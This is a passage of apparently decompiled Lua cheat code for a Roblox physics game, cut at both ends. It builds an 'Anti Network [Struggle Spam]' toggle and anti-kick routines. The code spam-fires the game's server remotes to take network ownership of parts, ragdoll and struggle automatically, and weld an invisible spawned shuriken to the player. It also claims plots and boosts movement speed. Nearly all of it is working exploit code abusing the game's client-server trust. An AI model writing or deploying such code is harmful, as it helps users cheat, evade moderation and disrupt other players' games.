				local tbl6 = {
					Head = { X = 0, Y = 1.5, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Left Arm"] = { X = -1.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Right Arm"] = { X = 1.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Left Leg"] = { X = -0.5, Y = -2, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Right Leg"] = { X = 0.5, Y = -2, Z = 0, RX = 0, RY = 0, RZ = 0 },
				}

				local function fn14(arg, arg2, arg3)
					local v18 = arg:FindFirstChild(arg2)
					local v19

					if v18 then
						v19 = v18
					else
						v19 = arg:WaitForChild(arg2, arg3 or 3)
					end

					return v19
				end

				local function fn15(arg)
					if _G.Cons and _G.Cons[arg] then
						_G.Cons[arg]:Disconnect()
						_G.Cons[arg] = nil
					end
				end

				local function fn16(arg)
					for k in pairs(tbl6) do
						local v18 = arg:FindFirstChild(k)

						if v18 and v18:IsA("BasePart") then
							v18.CanCollide = false
							v18.Massless = false
						end
					end
				end

				local function fn17(arg)
					for k in pairs(tbl6) do
						local v18 = arg:FindFirstChild(k)

						if v18 and v18:IsA("BasePart") then
							v18.CanCollide = false
							v18.CanTouch = true
							v18.Massless = false
						end
					end
				end

				local function fn18(arg, enabled)
					if not arg then
						return
					end

					for _, v18 in ipairs({ "Left Leg", "Right Leg" }) do
						local v19 = arg:FindFirstChild(v18)

						if v19 then
							for _, child in ipairs(v19:GetChildren()) do
								if child:IsA("Constraint") or child:IsA("JointInstance") then
									child.Enabled = enabled
								end
							end
						end
					end
				end

				local function fn19(arg, arg2, arg3, arg4)
					if not arg4 then
						return
					end

					for k, v18 in pairs(tbl6) do
						local v19 = arg:FindFirstChild(k)

						if v19 and v19:IsA("BasePart") then
							if arg3 and (k == "Left Leg" or k == "Right Leg") then
								v19.CanCollide = false
								v19.CFrame = arg2 * CFrame.new(0, 3000, 0)
							else
								local cframe = CFrame.Angles
								local rad = math.rad
								local rz = v18.RZ
								v19.CFrame = arg2 * CFrame.new(v18.X, v18.Y, v18.Z) * cframe(math.rad(v18.RX), math.rad(v18.RY), rad(rz))
							end
						end
					end
				end

				local function fn20(arg)
					if flag10 then
						return
					end

					if arg then
						local humanoid = arg:FindFirstChildOfClass("Humanoid")

						if humanoid then
							walkSpeed = humanoid.WalkSpeed
							humanoid.WalkSpeed = 60
						end
					end

					flag10 = true

					if connection then
						connection:Disconnect()
					end

					connection = RunService.Stepped:Connect(function(time_, deltaTime)
						if not flag10 then
							return
						end
						local character2 = lp3.Character
						if not character2 then
							return
						end
						local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
						local humanoid = character2:FindFirstChildOfClass("Humanoid")
						if not humanoidRootPart2 or not humanoid then
							return
						end

						if not (humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman") then
							DisableBlobSpeed()
							return
						end
						humanoid.WalkSpeed = 80
						local moveDirection = humanoid.MoveDirection

						if moveDirection.Magnitude > 0 then
							local n27 = moveDirection.Unit * 60 * deltaTime
							humanoidRootPart2.CFrame = humanoidRootPart2.CFrame + Vector3.new(n27.X, 0, n27.Z)
						end
					end)
				end

				local function fn21()
					if not flag10 then
						return
					end
					flag10 = false

					if connection then
						connection:Disconnect()
						connection = nil
					end

					local character2 = lp3.Character

					if character2 then
						local humanoid = character2:FindFirstChildOfClass("Humanoid")

						if humanoid and walkSpeed then
							humanoid.WalkSpeed = walkSpeed
							walkSpeed = nil
						end
					end
				end

				local connection2 = nil
				local connection3 = nil
				local connection4 = nil
				local connection5 = nil
				local flag11 = false

				local function fn22(arg)
					local humanoidRootPart2 = fn14(arg, "HumanoidRootPart", 5)
					local humanoid = fn14(arg, "Humanoid", 5)
					local torso = fn14(arg, "Torso", 5) or fn14(arg, "UpperTorso", 5)
					if not (humanoidRootPart2 and humanoid and torso) then
						return
					end

					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end

					local flag12 = false
					local ragdollRemote = repS:FindFirstChild("CharacterEvents") and repS.CharacterEvents:FindFirstChild("RagdollRemote")

					local function fn23()
						if flag11 then
							return
						end
						flag11 = true

						if connection5 then
							connection5:Disconnect()
							connection5 = nil
						end

						fn18(arg, true)
						fn21()

						if humanoidRootPart2 then
							humanoidRootPart2.CFrame = humanoidRootPart2.CFrame + Vector3.new(0, 4, 0)
						end

						task.spawn(function()
							for i = 1, 20 do
								if humanoid then
									humanoid.Sit = false
								end

								task.wait(0.05)
							end

							flag12 = false
							flag11 = false
						end)
					end

					if connection4 then
						connection4:Disconnect()
					end

					connection4 = humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
						if flag11 then
							return
						end

						if humanoid.SeatPart and humanoid.SeatPart.Parent.Name == "CreatureBlobman" and not flag12 then
							flag12 = true
							local seatPart = humanoid.SeatPart
							fn20(arg)

							while not humanoid.Sit do
								task.wait()
							end

							if ragdollRemote then
								ragdollRemote:FireServer(humanoidRootPart2, 3)
							end

							while not humanoid.Ragdolled.Value and not humanoid.Sit do
								task.wait()
							end

							task.wait(0.4)
							humanoid.Sit = true
							seatPart:Sit(humanoid)
							fn18(arg, false)

							task.delay(0.25, function()
								if connection5 then
									connection5:Disconnect()
								end

								if flag11 then
									return
								end

								connection5 = RunService.Heartbeat:Connect(function()
									if humanoid and humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman" and ragdollRemote and lp3.Character and lp3.Character:FindFirstChild("HumanoidRootPart") then
										ragdollRemote:FireServer(lp3.Character.HumanoidRootPart, 1)
									elseif not flag11 then
										fn23()
									end
								end)
							end)
						end
					end)

					connection2 = RunService.Heartbeat:Connect(function()
						local flag13 = humanoid and humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman"
						local flag14 = humanoid and humanoid:FindFirstChild("Ragdolled") and humanoid.Ragdolled.Value == true

						if flag13 and not flag11 and flag8 then
							if UserInputService2:IsKeyDown(Enum.KeyCode.Space) then
								fn23()
								return
							end
						end

						if not flag8 then
							if flag14 then
								if humanoidRootPart2 and humanoidRootPart2.Parent then
									local lookVector = currentCamera.CFrame.LookVector
									local v18 = math.atan2(-lookVector.X, -lookVector.Z)
									humanoidRootPart2.CFrame = CFrame.new(humanoidRootPart2.Position) * CFrame.Angles(0, v18, 0)
								end

								if torso and torso.Parent then
									fn19(arg, torso.CFrame, flag13, flag14)
								end

								return
							end

							if connection2 then
								connection2:Disconnect()
								connection2 = nil
							end

							if connection4 then
								connection4:Disconnect()
								connection4 = nil
							end

							if connection5 then
								connection5:Disconnect()
								connection5 = nil
							end

							fn17(arg)
							fn18(arg, true)

							if humanoidRootPart2 then
								humanoidRootPart2.Anchored = false
							end

							if humanoid then
								humanoid.PlatformStand = false
							end

							fn21()
							return
						end

						if not (humanoidRootPart2 and humanoidRootPart2.Parent) then
							return
						end

						if not flag13 and not flag11 then
							humanoid.PlatformStand = false
							humanoid.Sit = false
						end

						local lookVector = currentCamera.CFrame.LookVector
						local v18 = math.atan2(-lookVector.X, -lookVector.Z)
						humanoidRootPart2.CFrame = CFrame.new(humanoidRootPart2.Position) * CFrame.Angles(0, v18, 0)

						if torso and torso.Parent then
							fn19(arg, torso.CFrame, flag13, flag14)
						end
					end)

					if connection3 then
						connection3:Disconnect()
						connection3 = nil
					end

					local characterEvents = repS:FindFirstChild("CharacterEvents")

					if characterEvents and characterEvents:FindFirstChild("Struggle") then
						connection3 = RunService.Heartbeat:Connect(function()
							if not flag8 then
								return
							end

							pcall(function()
								characterEvents.Struggle:FireServer(lp3)
							end)
						end)
					end

					fn16(arg)
				end

				local function fn23(arg)
					if connection3 then
						connection3:Disconnect()
						connection3 = nil
					end

					if connection4 then
						connection4:Disconnect()
						connection4 = nil
					end

					if connection5 then
						connection5:Disconnect()
						connection5 = nil
					end

					local humanoid = arg and arg:FindFirstChild("Humanoid")
					local flag12 = humanoid and humanoid:FindFirstChild("Ragdolled") and humanoid.Ragdolled.Value == true
					fn21()

					if not flag12 then
						if arg then
							fn17(arg)
							local humanoidRootPart2 = arg:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart2 then
								humanoidRootPart2.Anchored = false
							end

							if humanoid then
								humanoid.PlatformStand = false
							end

							fn18(arg, true)
						end

						if connection2 then
							connection2:Disconnect()
							connection2 = nil
						end
					end
				end

				local function fn24()
					if thread then
						task.cancel(thread)
						thread = nil
					end

					flag9 = false
				end

				local function fn25()
					fn24()
					flag9 = true
					local ragdollRemote = repS:FindFirstChild("CharacterEvents") and repS.CharacterEvents:FindFirstChild("RagdollRemote")

					thread = task.spawn(function()
						while flag9 do
							local character2 = lp3.Character

							if character2 and ragdollRemote then
								local humanoid = character2:FindFirstChild("Humanoid")

								if not (humanoid and humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman") then
									local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")

									if humanoidRootPart2 then
										pcall(function()
											ragdollRemote:FireServer(humanoidRootPart2, 1)
										end)
									end
								end
							end

							task.wait(0.1)
						end
					end)
				end

				local thread2 = nil

				local function fn26()
					if thread2 then
						task.cancel(thread2)
						thread2 = nil
					end

					thread2 = task.spawn(function()
						fn25()
						task.wait()
						flag8 = true

						if lp3.Character then
							fn22(lp3.Character)
						end

						thread2 = nil
					end)
				end

				local function fn27()
					if thread2 then
						task.cancel(thread2)
						thread2 = nil
					end

					flag8 = false
					fn24()
					fn23(lp3.Character)
				end

				antiFunctionsBlock:CreateToggle({
					Name = "Anti Network [Struggle Spam]",
					Default = false,
					Callback = function(arg)
						if arg then
							fn26()
							fn15("AN_CharAdded")

							_G.Cons.AN_CharAdded = lp3.CharacterAdded:Connect(function(character2)
								task.wait()

								if flag8 then
									fn22(character2)
								end
							end)
						else
							fn27()
							fn15("AN_CharAdded")
						end
					end,
				})
			end
		end

		local antiFunctionsBlock
		antiFunctionsBlock = _G.AntiFunctionsBlock
		if not antiFunctionsBlock then
			return
		end
		local lp
		lp = _G.LP
		local ws
		ws = _G.WS
		local setNetworkOwner
		setNetworkOwner = _G.GE and _G.GE:FindFirstChild("SetNetworkOwner")
		local stickyEvent
		stickyEvent = _G.StickyEvent
		local spawnRemote
		spawnRemote = _G.SpawnRemote
		local destroyRemote
		destroyRemote = _G.DestroyRemote
		local canSpawn
		canSpawn = _G.CanSpawn
		local cf
		cf = _G.CF or CFrame.new
		local v32
		v32 = _G.V3 or Vector3.new
		local rs
		rs = _G.RS or game:GetService("RunService")
		local flag7
		flag7 = false
		local str5
		str5 = "Base Shuriken"
		local flag8
		flag8 = false
		local flag9
		flag9 = false
		local flag10
		flag10 = false
		local thread
		thread = nil
		local thread2
		thread2 = nil
		local thread3
		thread3 = nil
		local v16
		v16 = nil
		local n25
		n25 = 0
		local v17
		v17 = nil
		local connection
		connection = nil
		local connection2
		connection2 = nil
		local flag11
		flag11 = false
		local v18
		v18 = nil
		local v19
		v19 = nil
		local connection3
		connection3 = nil
		local v20
		v20 = nil
		local flag12
		flag12 = false
		local thread4
		thread4 = nil
		local tbl5
		tbl5 = {}
		local flag13
		flag13 = false
		local v21
		v21 = nil
		local tbl6
		tbl6 = {}
		local tbl7
		tbl7 = {}
		local tbl8
		tbl8 = {}
		local thread5
		thread5 = nil
		local v22
		v22 = nil
		local str6
		str6 = "PlayerCharacterLocationDetector"
		local n26
		n26 = 1
		local n27
		n27 = 3
		local fn12, fn13

		do
			local flag14 = false
			local connection4 = nil

			local function fn14(arg, arg2, arg3)
				if not arg then
					return nil
				end
				local v23 = arg:FindFirstChild(arg2)

				if not v23 then
					v23 = arg:WaitForChild(arg2, arg3 or 3)
				end

				return v23
			end

			fn12 = function()
				if v16 and destroyRemote then
					task.spawn(function()
						destroyRemote:FireServer(v16)
					end)
				end

				v16 = nil
				flag14 = false
			end

			local function fn15()
				local character = lp.Character
				if not character then
					return nil
				end
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return nil
				end
				return fn14(humanoidRootPart, "FirePlayerPart", 3)
			end

			local function fn16(arg)
				if not arg or not arg.Parent then
					return
				end

				for _, descendant in ipairs(arg:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
						descendant.CanQuery = false
					end
				end
			end

			local function fn17(arg, arg2)
				if not arg or not arg2 or not arg.Parent or not arg2.Parent then
					return false
				end

				if table.find(arg:GetConnectedParts(), arg2) then
					return true
				end

				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("Weld") or child:IsA("WeldConstraint") or child.Name:lower():find("weld") then
						local isWeld = child:IsA("Weld")
						local flag15

						if isWeld then
							flag15 = child.Part0 == arg2 or child.Part1 == arg2
						else
							flag15 = isWeld
						end

						flag15 = flag15 or child:IsA("WeldConstraint") and (child.Part0 == arg2 or child.Part1 == arg2)
						if flag15 then
							return true
						end
					end
				end

				return false
			end

			local function fn18(arg, arg2, arg3)
				local n28 = arg3 or 0.5
				local now2 = tick()

				while tick() - now2 < n28 do
					if fn17(arg, arg2) then
						return true
					end
					task.wait()
				end

				return false
			end

			local function fn19(arg, arg2)
				if flag14 then
					return
				end
				flag14 = true
				fn16(arg2)

				if setNetworkOwner then
					task.spawn(function()
						setNetworkOwner:FireServer(arg, arg.CFrame)
					end)
				end

				local v23 = fn15()

				if v23 and stickyEvent then
					task.spawn(function()
						stickyEvent:FireServer(arg, v23, CFrame.Angles(0, 1.5707963267948966, 1.5707963267948966))
					end)
				end

				task.wait()
				fn16(arg2)
				flag14 = false
			end

			local function fn20()
				if not flag8 or flag14 then
					return
				end
				local value = canSpawn and canSpawn.Value
				local now2 = tick()

				while true do
					if not value and flag8 then
						if not (tick() - now2 > 3) then
							task.wait()
							value = canSpawn and canSpawn.Value
							continue
						end
					end

					break
				end

				if not flag8 then
					return
				end
				fn12()
				local character = lp.Character
				if not character then
					return
				end
				local head = character:FindFirstChild("Head")
				if not head then
					return
				end
				local n28 = CFrame.new(head.Position) * CFrame.new(0, 15, 20)
				local v23 = ws:FindFirstChild(lp.Name .. "SpawnedInToys")
				local tbl9 = {}

				if v23 then
					for _, child in ipairs(v23:GetChildren()) do
						if child.Name == "NinjaShuriken" then
							tbl9[child] = true
						end
					end
				end

				task.spawn(function()
					spawnRemote:InvokeServer("NinjaShuriken", n28, v32(0, 0, 0))
				end)

				local now3 = tick()
				local v24 = nil

				while true do
					if not v24 and flag8 then
						if not (tick() - now3 > 3) then
							local v25 = ws:FindFirstChild(lp.Name .. "SpawnedInToys")

							if v25 then
								for _, child in ipairs(v25:GetChildren()) do
									if child.Name == "NinjaShuriken" and not tbl9[child] then
										v24 = child
										break
									end
								end
							end

							if not v24 then
								task.wait()
							end

							continue
						end
					end

					break
				end

				if not v24 or not flag8 then
					return
				end
				v16 = v24
				v24.Name = "AntiKick"

				for _, descendant in ipairs(v24:GetDescendants()) do
					if descendant:IsA("BasePart") and descendant.Name ~= "StickyPart" and descendant.Name ~= "SoundPart" then
						descendant.Transparency = 1
					elseif descendant:IsA("Decal") or descendant:IsA("Texture") then
						descendant.Transparency = 1
					end
				end

				n25 = tick()
				local stickyPart = fn14(v24, "StickyPart", 2)
				if not stickyPart or not stickyPart.Parent then
					return
				end
				fn16(v24)
				fn19(stickyPart, v24)
			end

			fn13 = function()
				flag8 = true

				if connection4 then
					connection4:Disconnect()
				end

				connection4 = lp.CharacterRemoving:Connect(function()
					fn12()
				end)

				thread = task.spawn(function()
					local tbl9 = {}

					local function fn21(arg)
						if arg:IsA("BasePart") and arg.Name ~= "StickyPart" and arg.Name ~= "SoundPart" then
							arg.Transparency = 1
						elseif arg:IsA("Decal") or arg:IsA("Texture") then
							arg.Transparency = 1
						end
					end

					local function fn22(arg, arg2)
						if not arg or not arg.Parent then
							return
						end

						for _, descendant in ipairs(arg:GetDescendants()) do
							if descendant:IsA("BasePart") and descendant.Name ~= "StickyPart" and descendant.Name ~= "SoundPart" then
								descendant.Transparency = arg2 and 0 or 1
							elseif descendant:IsA("Decal") or descendant:IsA("Texture") then
								descendant.Transparency = arg2 and 0 or 1
							end
						end
					end

					local function fn23(arg)
						if not arg or not arg.Parent then
							return
						end

						for k, v23 in pairs(tbl9) do
							if k ~= arg and v23 then
								v23:Disconnect()
								tbl9[k] = nil
							end
						end

						if tbl9[arg] then
							tbl9[arg]:Disconnect()
						end

						fn22(arg, false)

						tbl9[arg] = arg.DescendantAdded:Connect(function(descendant)
							if v16 ~= arg or not arg.Parent then
								return
							end
							fn21(descendant)
						end)
					end

					local function fn24(arg)
						while arg and arg ~= ws do
							if arg.Name == "NinjaShuriken" or arg.Name == "AntiKick" then
								return arg
							end
							arg = arg.Parent
						end

						return nil
					end

					local connection5 = ws.DescendantAdded:Connect(function(descendant)
						if not flag8 then
							return
						end
						local v23 = fn24(descendant)
						if not v23 or v23 ~= v16 then
							return
						end

						if descendant:IsA("BasePart") or descendant:IsA("Decal") or descendant:IsA("Texture") then
							fn21(descendant)
						end

						if not tbl9[v23] then
							fn23(v23)
						end

						if descendant:IsA("BasePart") then
							descendant.CanCollide = false
							descendant.CanQuery = false
						end
					end)

					local n28 = 0

					while flag8 do
						if not flag14 then
							local v23 = v16
							local parent = v16

							if v23 then
								parent = v23.Parent
							end

							if parent then
								fn23(v23)
								fn16(v23)
								local character = lp.Character
								character = character and character:FindFirstChild("HumanoidRootPart")
								local stickyPart = v23:FindFirstChild("StickyPart")
								local soundPart = v23:FindFirstChild("SoundPart") or stickyPart

								if character and stickyPart then
									local v24 = fn15()

									if v24 and fn17(stickyPart, v24) then
										fn22(v23, true)
									else
										fn22(v23, false)
									end

									local partOwner = stickyPart:FindFirstChild("PartOwner")
									local flag15, flag16

									if partOwner and partOwner.Value ~= "" then
										if partOwner.Value == lp.Name then
											flag15 = false
											flag16 = true
										else
											flag15 = true
											flag16 = false
										end
									else
										flag16 = false
										flag15 = false

										for _, descendant in ipairs(v23:GetDescendants()) do
											local partOwner2 = descendant:FindFirstChild("PartOwner")

											if partOwner2 and partOwner2.Value ~= "" then
												if partOwner2.Value == lp.Name then
													flag16 = true
												else
													flag15 = true
												end

												break
											end
										end
									end

									if not flag16 and (stickyPart.Position - character.Position).Magnitude > 30 then
										fn22(v23, false)
										fn12()
										task.wait()

										if flag8 then
											fn20()
											local v25 = v16

											if v25 then
												fn23(v25)
											end
										end

										task.wait()
										n28 = 0
									else
										if flag15 then
											if setNetworkOwner then
												if soundPart then
													setNetworkOwner:FireServer(soundPart, soundPart.CFrame)
												end

												setNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
											end

											task.wait()
											local partOwner2 = stickyPart and stickyPart:FindFirstChild("PartOwner")
											local flag17

											if partOwner2 and partOwner2.Value ~= "" and partOwner2.Value ~= lp.Name then
												flag17 = true
											else
												flag17 = false

												for _, descendant in ipairs(v23:GetDescendants()) do
													local partOwner3 = descendant:FindFirstChild("PartOwner")
													if partOwner3 and partOwner3.Value ~= "" and partOwner3.Value ~= lp.Name then
														flag17 = true
														break
													end
												end
											end

											local parent2 = not flag17 and stickyPart and stickyPart.Parent
											n28 = 0

											if parent2 then
												local v25 = fn15()

												if v25 and stickyEvent then
													if setNetworkOwner then
														setNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
													end

													stickyEvent:FireServer(stickyPart, v25, CFrame.Angles(0, 1.5707963267948966, 1.5707963267948966))

													if fn18(stickyPart, v25, 0.05) then
														fn22(v23, true)
													else
														fn22(v23, false)
													end
												end
											end
										else
											if n28 == 0 then
												n28 = tick()
											end

											local v25 = fn15()
											local v26 = v25 and fn17(stickyPart, v25)

											if v26 then
												fn22(v23, true)
											else
												fn22(v23, false)
											end

											if tick() - n28 >= 0.001 and not v26 then
												fn22(v23, false)

												if v25 and stickyEvent then
													stickyEvent:FireServer(stickyPart, v25, CFrame.Angles(0, 1.5707963267948966, 1.5707963267948966))

													if fn18(stickyPart, v25, 0.001) then
														fn22(v23, true)
													end
												end
											end
										end

										task.wait()
									end

									continue
								end
							else
								local flag15 = not flag14 and flag8
								n28 = 0

								if flag15 then
									fn20()
								end
							end
						end

						task.wait()
					end

					if connection5 then
						connection5:Disconnect()
					end

					for k, v23 in pairs(tbl9) do
						if v23 then
							v23:Disconnect()
						end

						tbl9[k] = nil
					end
				end)
			end
		end

		local fn14, fn15, fn16, fn17

		do
			local function fn18(arg)
				if not arg or not arg.Parent then
					return
				end
				local stickyPart = arg:FindFirstChild("StickyPart")
				if not stickyPart then
					return
				end
				local tbl9 = {}

				local function fn19(arg2)
					if arg2 and arg2 ~= "" and arg2 ~= lp.Name then
						if v16 == arg then
							v16 = nil
						end

						pcall(function()
							if destroyRemote then
								destroyRemote:FireServer(arg)
							end
						end)

						for _, v23 in ipairs(tbl9) do
							v23:Disconnect()
						end

						return true
					end

					return false
				end

				local partOwner = stickyPart:FindFirstChild("PartOwner")

				if partOwner then
					if fn19(partOwner.Value) then
						return
					end

					table.insert(tbl9, partOwner:GetPropertyChangedSignal("Value"):Connect(function()
						fn19(partOwner.Value)
					end))
				end

				table.insert(tbl9, arg.DescendantAdded:Connect(function(descendant)
					if descendant.Name == "PartOwner" then
						if fn19(descendant.Value) then
							return
						end

						table.insert(tbl9, descendant:GetPropertyChangedSignal("Value"):Connect(function()
							fn19(descendant.Value)
						end))
					end
				end))

				table.insert(tbl9, arg.AncestryChanged:Connect(function(child, parent)
					if not parent then
						for _, v23 in ipairs(tbl9) do
							v23:Disconnect()
						end
					end
				end))
			end

			local function fn19(arg)
				local plotSign = arg:FindFirstChild("PlotSign")
				if not plotSign then
					return false
				end
				local thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")
				if not thisPlotsOwners then
					return false
				end

				for _, child in pairs(thisPlotsOwners:GetChildren()) do
					if child:IsA("StringValue") and child.Value ~= "" then
						return false
					end
				end

				return true
			end

			local function fn20(arg)
				if not arg then
					return false
				end
				local plotSign = arg:FindFirstChild("PlotSign")
				if not plotSign then
					return false
				end
				local thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")
				if not thisPlotsOwners then
					return false
				end

				for _, child in pairs(thisPlotsOwners:GetChildren()) do
					if child:IsA("StringValue") and child.Value == lp.Name then
						return true
					end
				end

				return false
			end

			local function fn21()
				local plots = ws:FindFirstChild("Plots")
				if not plots then
					return nil
				end
				local n28 = 1

				while n28 <= 50 do
					local v23 = plots:FindFirstChild("Plot" .. n28)
					if v23 and fn19(v23) then
						return v23
					end
					n28 += 1
				end

				return nil
			end

			local function fn22()
				local plots = ws:FindFirstChild("Plots")
				if not plots then
					return nil
				end
				local n28 = 1

				while n28 <= 50 do
					local v23 = plots:FindFirstChild("Plot" .. n28)
					if v23 and fn20(v23) then
						return v23
					end
					n28 += 1
				end

				return nil
			end

			local function fn23(arg)
				local tbl9 = {}
				local plotSign = arg:FindFirstChild("PlotSign")
				if not plotSign then
					return tbl9
				end

				for _, child in pairs(plotSign:GetChildren()) do
					if child.Name:find("Sign") then
						local plus = child:FindFirstChild("Plus")

						if plus then
							for _, child2 in pairs(plus:GetChildren()) do
								if child2:IsA("BasePart") then
									table.insert(tbl9, child2)
								end
							end
						end
					end
				end

				if #tbl9 == 0 and plotSign.PrimaryPart then
					table.insert(tbl9, plotSign.PrimaryPart)
				end

				return tbl9
			end

			fn14 = function()
				local playersInPlots = ws:FindFirstChild("PlotItems") and ws.PlotItems:FindFirstChild("PlayersInPlots")
				return playersInPlots and playersInPlots:FindFirstChild(lp.Name) ~= nil
			end

			fn15 = function()
				if connection then
					connection:Disconnect()
					connection = nil
				end

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			local function fn24(arg)
				if not arg then
					return false
				end
				flag11 = true
				local v23 = fn23(arg)[1]
				if not v23 then
					flag11 = false
					return false
				end
				fn15()

				local function fn25()
					if not flag9 then
						fn15()
						return
					end
					local humanoidRootPart = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						local n28 = v23.Position + v32(0, 7, 0)
						local lookVector = humanoidRootPart.CFrame.LookVector
						local v24 = v32(lookVector.X, 0, lookVector.Z)
						local unit

						if v24.Magnitude == 0 then
							unit = v32(0, 0, -1)
						else
							unit = v24.Unit
						end

						humanoidRootPart.CFrame = humanoidRootPart.CFrame:Lerp(cf(n28, n28 + unit), 0.4)
						humanoidRootPart.AssemblyLinearVelocity = v32(0, 0, 0)
						humanoidRootPart.AssemblyAngularVelocity = v32(0, 0, 0)
					end
				end

				connection = rs.RenderStepped:Connect(fn25)
				connection2 = rs.Heartbeat:Connect(fn25)
				local n28 = 0

				while not fn14() and flag9 and n28 < 100 do
					task.wait()
					n28 += 1
				end

				fn15()
				flag11 = false
				if fn14() then
					return true
				end
				return false
			end

			local function fn25(arg)
				if not fn24(arg) then
					return false
				end
				local v23 = fn23(arg)

				while not fn20(arg) and flag9 do
					for _, v24 in pairs(v23) do
						pcall(function()
							if setNetworkOwner then
								setNetworkOwner:FireServer(v24, v24.CFrame)
							end
						end)
					end

					task.wait(0.6)
				end

				if fn20(arg) then
					return true
				end
				return false
			end

			local function fn26()
				local v23 = fn22()
				if v23 then
					return v23
				end
				local v24 = fn21()

				if v24 then
					if fn25(v24) then
						return v24
					end
				end

				return nil
			end

			local function fn27()
				local plotItems = ws:FindFirstChild("PlotItems")
				if not v17 or not plotItems then
					return nil
				end
				return plotItems:FindFirstChild(v17.Name)
			end

			fn16 = function()
				local v23 = fn27()

				if v23 and destroyRemote then
					for _, child in pairs(v23:GetChildren()) do
						if child.Name == "AntiKick_House" or child.Name == "NinjaShuriken" then
							pcall(function()
								destroyRemote:FireServer(child)
							end)
						end
					end
				end

				v16 = nil
			end

			local function fn28()
				local character = lp.Character
				return character and character:FindFirstChild("Head")
			end

			local function fn29()
				local character = lp.Character
				return character and character:FindFirstChild("HumanoidRootPart")
			end

			local function fn30(arg)
				if not arg then
					return false
				end
				local stickyPart = arg:FindFirstChild("StickyPart") or arg:WaitForChild("StickyPart", 5)
				if not stickyPart then
					return false
				end
				local v23 = fn29()
				if not v23 then
					return false
				end
				local firePlayerPart = v23:FindFirstChild("FirePlayerPart") or v23:WaitForChild("FirePlayerPart", 2)
				if not firePlayerPart then
					return false
				end

				while stickyPart and stickyPart.Parent and (not stickyPart:FindFirstChild("PartOwner") or stickyPart.PartOwner.Value ~= lp.Name) do
					if not flag9 then
						return false
					end

					pcall(function()
						if setNetworkOwner then
							setNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
						end
					end)

					task.wait()
				end

				if stickyEvent then
					pcall(function()
						stickyEvent:FireServer(stickyPart, firePlayerPart, CFrame.Angles(1.5707963267948966, 0.78539816339744828, 0))
					end)
				end

				for _, child in pairs(arg:GetChildren()) do
					if child:IsA("BasePart") then
						child.CanQuery = false
					end
				end

				task.spawn(fn18)
				return true
			end

			local function fn31()
				if not v17 then
					return
				end

				if not fn14() then
					fn24(v17)
				end

				if not fn14() then
					return
				end
				local character = lp.Character
				character = character and character:FindFirstChild("Humanoid")
				if not character or character.Health <= 0 then
					return
				end
				fn16()
				if not canSpawn or not canSpawn.Value then
					return
				end
				local v23 = fn28()
				if not v23 then
					return
				end

				while not canSpawn.Value and flag9 do
					task.wait()
				end

				n25 = tick()
				local v24 = fn27()
				local tbl9 = {}

				if v24 then
					for _, child in ipairs(v24:GetChildren()) do
						if child.Name == "NinjaShuriken" or child.Name == "AntiKick_House" then
							tbl9[child] = true
						end
					end
				end

				task.spawn(function()
					pcall(function()
						spawnRemote:InvokeServer("NinjaShuriken", v23.CFrame * cf(0, 12.5, 20), v32(0, 0, 0))
					end)
				end)

				local v25 = nil
				local n28 = 0

				while not v25 and flag9 and n28 < 50 do
					local v26 = fn27()

					if v26 then
						for _, child in ipairs(v26:GetChildren()) do
							if child.Name == "NinjaShuriken" and not tbl9[child] then
								v25 = child
								break
							end
						end
					end

					if not v25 then
						task.wait()
						n28 += 1
					end
				end

				if v25 and flag9 then
					v16 = v25
					v25.Name = "AntiKick_House"
					fn30(v25)
				end
			end

			local function fn32()
				while flag9 do
					local character = lp.Character
					local humanoid = character and character:FindFirstChild("Humanoid")
					character = character and character:FindFirstChild("HumanoidRootPart")

					if humanoid and humanoid.Health > 0 and character then
						if not v17 or not fn20(v17) then
							v17 = fn26()
						end

						if v17 then
							local flag14

							if not v16 or not v16:IsDescendantOf(ws) then
								flag14 = true
							else
								local stickyPart = v16:FindFirstChild("StickyPart")

								if not stickyPart then
									flag14 = true
								else
									local stickyWeld = stickyPart:FindFirstChild("StickyWeld")
									local partOwner = stickyPart:FindFirstChild("PartOwner")
									local flag15 = not stickyWeld or partOwner and partOwner.Value ~= lp.Name and partOwner.Value ~= ""
									flag14 = false

									if flag15 then
										flag14 = true
									end
								end
							end

							if flag14 then
								fn31()
							else
								local stickyPart = v16:FindFirstChild("StickyPart")

								if stickyPart then
									if not stickyPart:FindFirstChild("StickyWeld") and tick() - n25 > 0.005 then
										pcall(function()
											if setNetworkOwner then
												setNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
											end
										end)

										local v23 = fn29()

										if v23 then
											local firePlayerPart = v23:FindFirstChild("FirePlayerPart")

											if firePlayerPart and stickyEvent then
												stickyEvent:FireServer(stickyPart, firePlayerPart, CFrame.Angles(1.5707963267948966, 0.78539816339744828, 0))
											end
										end
									end
								end
							end
						else
							task.wait()
						end
					else
						if v16 then
							fn16()
						end

						if v17 then
							fn24(v17)
						end
					end

					task.wait()
				end
			end

			fn17 = function()
				flag9 = true
				thread2 = task.spawn(fn32)
			end
		end

		local fn18

		fn18 = function()
			local character = lp.Character
			if not character then
				return nil
			end
